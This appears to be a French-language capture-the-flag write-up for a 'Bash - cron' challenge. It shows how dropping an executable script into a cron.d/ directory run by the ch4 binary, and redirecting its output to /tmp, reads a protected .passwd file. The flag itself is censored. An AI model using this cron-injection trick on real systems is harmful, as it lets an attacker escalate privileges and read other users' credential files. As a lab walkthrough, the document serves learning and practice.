
# Bash - cron
## 20 Points
### Crontab
## Énoncé
Paramètres de connexion au challenge

## Solution

Pour ce challenge, le but est de jouer avec le dossier cron.d/ présent au root du challenge. On a un fichier exécutable **ch4** qui va regarder les fichiers à l'intérieur du dossier cron.d/, si le fichier est exécutable, l'exécuter, puis rm tout les fichiers de cron.d/.

Notre objectif va donc être de voir si on peut créer un fichier dans cron.d/ et y injecter cat .passwd, pour cela on va faire:
```bash
echo "cat /challenge/app-script/ch4/.passwd" > cron.d/test && chmod 777 cron.d/test
```

lorsque l'on cat le fichier, on voit qu'il a bien été créer:

```bash
app-script-ch4@challenge02:~$ cat cron.d/test
cat /challenge/app-script/ch4/.passwd
```

Le fichier est bien créer, on va donc lancer **ch4** pour que cela exécute le fichier.

On attend que le fichier s'éxecute, mais on se rend compte que rien ne se passe, même en faisant un cat du fichier, on se rend compte que le fichier a été supprimé. Il faut donc rediriger la sortie du cat vers un fichier. Pour cela on va faire:
```bash
echo "cat /challenge/app-script/ch4/.passwd > /tmp/cracked" > cron.d/test && chmod 777 cron.d/test
```

En suite on lance **ch4**, on attend de voir quand notre fichier test sera supprimé, puis on va cat le fichier de redirection pour voir si cela à bien marcher:
```bash
app-script-ch4@challenge02:~$ cat cron.d/test
cat /challenge/app-script/ch4/.passwd > /tmp/tib
app-script-ch4@challenge02:~$ cat cron.d/test
cat: cron.d/test: No such file or directory
app-script-ch4@challenge02:~$ cat /tmp/tib
[censorship]
```
and voilà !
